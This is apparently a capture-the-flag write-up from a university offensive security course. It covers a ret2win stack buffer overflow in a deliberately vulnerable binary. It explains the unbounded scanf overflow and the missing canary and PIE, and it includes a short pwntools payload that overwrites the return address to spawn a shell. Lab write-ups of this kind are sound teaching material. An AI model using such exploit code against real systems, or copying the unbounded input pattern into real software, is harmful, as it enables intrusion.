# Mini-Game

**Category:** pwn / stack buffer overflow (ret2win) · **Course:** Offensive Security (PoliTo)

## Challenge

`vuln()` keeps a local function pointer `func_ptr` (initialised to `lose`) right next to a 64-byte buffer, and calls whatever `func_ptr` points to after reading input. A `win()` that pops a shell exists but is never assigned. The challenge is *designed* around overwriting `func_ptr`, but it's also solvable as a plain ret2win — which is the route taken here.

## Vulnerability

`scanf("%s", buffer)` overflows `char buffer[64]` with no bound. Since there's no stack canary and the binary is `-no-pie` (fixed addresses), the overflow can reach the saved return address of `vuln()` and redirect execution straight into `win()`.

## Exploitation

1. Overflow offset to the saved return address: **72 bytes**.
2. Place a bare `ret` gadget first for 16-byte stack alignment (otherwise the `movaps` inside `system()` faults), then return into `win()`, which runs `system("/bin/sh")`.

As in `solve.py`:

```python
offset  = 72
ret_add = 0x000000000040101a      # bare `ret`, for 16-byte stack alignment

payload = flat(
    b"A" * offset,
    p64(ret_add),
    p64(elf.sym.win),
)
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-fno-stack-protector -no-pie -O0 -g`: no canary, fixed load address)
- `mini_game` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
